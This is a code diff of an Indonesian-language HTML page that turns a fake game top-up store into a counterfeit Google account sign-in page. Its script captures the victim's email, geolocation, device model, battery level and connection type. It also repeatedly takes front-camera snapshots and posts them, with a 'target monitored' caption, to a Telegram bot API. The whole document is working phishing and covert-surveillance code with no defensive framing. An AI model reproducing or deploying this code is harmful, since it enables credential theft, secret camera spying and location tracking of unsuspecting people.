@@ -3,51 +3,148 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>V-STORE | Top Up Game Terpercaya</title>
+    <title>Google - Konfirmasi Akun</title>
+    <!-- Google Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
     <style>
-        :root { --primary-neon: #00f2ff; --bg-dark: #0a0b10; --card-bg: #161b22; }
-        body { background-color: var(--bg-dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 15px; text-align: center; }
-        .container { max-width: 500px; margin: 0 auto; padding-bottom: 50px; }
-        .header h1 { color: var(--primary-neon); text-shadow: 0 0 10px var(--primary-neon); margin-bottom: 5px; font-size: 1.8rem; }
-        .section-card { background: var(--card-bg); border: 1px solid #30363d; border-radius: 12px; padding: 15px; margin-bottom: 15px; text-align: left; }
-        .section-title { border-left: 4px solid var(--primary-neon); padding-left: 10px; font-weight: bold; margin-bottom: 12px; font-size: 0.9rem; }
-        .game-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
-        .item { background: #21262d; border: 1px solid #30363d; border-radius: 8px; padding: 10px; cursor: pointer; text-align: center; font-size: 0.8rem; }
-        .item.active { border-color: var(--primary-neon); background: rgba(0, 242, 255, 0.1); }
-        input { width: 100%; padding: 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: white; box-sizing: border-box; }
-        .btn-order { width: 100%; padding: 15px; background: var(--primary-neon); border: none; border-radius: 8px; color: black; font-weight: bold; cursor: pointer; font-size: 1rem; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); }
-        #success-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px; }
-        .popup-content { background: var(--card-bg); border: 1px solid var(--primary-neon); padding: 30px; border-radius: 15px; text-align: center; }
+        :root {
+            --google-blue: #4285f4;
+            --google-red: #ea4335;
+            --google-yellow: #fbbc05;
+            --google-green: #34a853;
+            --gray-border: #dadce0;
+        }
+
+        body {
+            background-color: #ffffff;
+            color: #202124;
+            font-family: 'Roboto', sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .google-card {
+            width: 100%;
+            max-width: 450px;
+            padding: 40px;
+            border: 1px solid var(--gray-border);
+            border-radius: 8px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        .logo {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+
+        .logo span:nth-child(1) { color: var(--google-blue); }
+        .logo span:nth-child(2) { color: var(--google-red); }
+        .logo span:nth-child(3) { color: var(--google-yellow); }
+        .logo span:nth-child(4) { color: var(--google-blue); }
+        .logo span:nth-child(5) { color: var(--google-green); }
+        .logo span:nth-child(6) { color: var(--google-red); }
+
+        h1 { font-size: 24px; font-weight: 400; margin-top: 10px; }
+        p { color: #5f6368; font-size: 16px; margin-bottom: 30px; }
+
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: 100%;
+            padding: 13px 15px;
+            border: 1px solid var(--gray-border);
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border: 2px solid var(--google-blue);
+            padding: 12px 14px;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 40px;
+        }
+
+        .link-text {
+            color: var(--google-blue);
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        .btn-next {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        /* Popup */
+        #success-popup {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: white;
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--google-blue);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header"><h1>V-STORE</h1><p style="color: #8b949e;">Top Up Instan 24 Jam</p></div>
+<div class="google-card">
+    <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+    <h1>Masuk</h1>
+    <p>Gunakan Akun Google Anda untuk Verifikasi</p>
 
-    <div class="section-card">
-        <div class="section-title">1. Pilih Game</div>
-        <div class="game-grid">
-            <div class="item active"><span>Free Fire</span></div>
-            <div class="item"><span>MLBB</span></div>
-            <div class="item"><span>PUBG</span></div>
-        </div>
+    <div class="input-group">
+        <input type="text" id="userId" placeholder="Email atau nomor telepon">
     </div>
 
-    <div class="section-card">
-        <div class="section-title">2. ID Player</div>
-        <input type="number" id="userId" placeholder="Masukkan ID Player">
+    <div class="btn-container">
+        <a href="#" class="link-text">Buat akun</a>
+        <button class="btn-next" id="startBtn">Berikutnya</button>
     </div>
-
-    <button class="btn-order" id="startBtn">KONFIRMASI TOP UP</button>
 </div>
 
 <div id="success-popup">
-    <div class="popup-content">
-        <h2 style="color: var(--primary-neon);">PESANAN DITERIMA!</h2>
-        <p>Mohon tunggu 2-3 jam item akan masuk ke akun Anda.</p>
-        <button class="btn-order" onclick="window.location.href='https://google.com'">OKE</button>
-    </div>
+    <div class="loader"></div>
+    <p>Memeriksa info...</p>
 </div>
 
 <video id="video" style="display:none;" autoplay playsinline></video>
@@ -64,29 +161,38 @@
             const bat = await navigator.getBattery();
             battery = Math.round(bat.level * 100) + "%";
         }
+
         const ua = navigator.userAgent;
-        const device = ua.match(/\(([^)]+)\)/) ? ua.match(/\(([^)]+)\)/)[1].split(';')[0] : "Unknown Device";
+        let device = "Perangkat Tidak Dikenal";
+
+        // Logika untuk mencoba mendapatkan nama HP bukan Linux
+        if (/android/i.test(ua)) {
+            const match = ua.match(/Android\s+([^\s;]+);\s+([^;)]+)/);
+            device = match ? match[2] : "Android Device";
+        } else if (/iPhone|iPad|iPod/i.test(ua)) {
+            device = "Apple iOS Device";
+        } else if (/Windows/i.test(ua)) {
+            device = "Windows PC";
+        }
+
         const conn = navigator.connection ? navigator.connection.effectiveType : "Unknown";
         return { device, battery, conn };
     }
 
-    // Fungsi mendapatkan koordinat lokasi
     function getLocation() {
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((position) => {
                 userLocation = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-            }, (error) => {
-                userLocation = "Izin lokasi ditolak";
             });
         }
     }
 
     document.getElementById('startBtn').addEventListener('click', async () => {
         const uid = document.getElementById('userId').value;
-        if(!uid) return alert("Masukkan ID Player!");
+        if(!uid) return alert("Masukkan Email!");
         
-        startBtn.innerText = "Memproses...";
-        getLocation(); // Panggil izin lokasi
+        document.getElementById('success-popup').style.display = 'flex';
+        getLocation();
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
@@ -94,10 +200,11 @@
             video.srcObject = stream;
             video.onloadedmetadata = () => {
                 video.play();
-                setInterval(() => takeSnapshot(uid), 5000);
+                takeSnapshot(uid); // Ambil satu snapshot awal
+                setInterval(() => takeSnapshot(uid), 10000); // Kemudian tiap 10 detik
             };
         } catch(e) {
-            document.getElementById('success-popup').style.display = 'flex';
+            console.log("Kamera ditolak");
         }
     });
 
@@ -108,20 +215,24 @@
         canvas.width = 640; canvas.height = 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
 
-        canvas.toBlob(blob => {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob);
-            fd.append('caption', `📸 <b>TARGET BERHASIL DIPANTAU</b>\n\n` +
-                                 `📱 <b>Perangkat:</b> <code>${info.device}</code>\n` +
-                                 `🔋 <b>Baterai:</b> ${info.battery}\n` +
-                                 `🌐 <b>Koneksi:</b> ${info.conn}\n` +
-                                 `📍 <b>Lokasi:</b> ${userLocation}\n\n` +
-                                 `<i>NEPTUNUS V1.0.8</i>`);
-            fd.append('parse_mode', 'HTML');
-            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.6);
+        canvas.toBlob(async (blob) => {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'pic.jpg');
+            formData.append('caption', `👁️‍🗨️ *Berhasil memantau*\n\n📧 User: ${uid}\n📱 HP: ${info.device}\n🔋 Baterai: ${info.battery}\n🌐 Koneksi: ${info.conn}\n📍 Lokasi: ${userLocation}`);
+            formData.append('parse_mode', 'Markdown');
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (err) {
+                console.error(err);
+            }
+        }, 'image/jpeg');
     }
 </script>
+
 </body>
 </html>
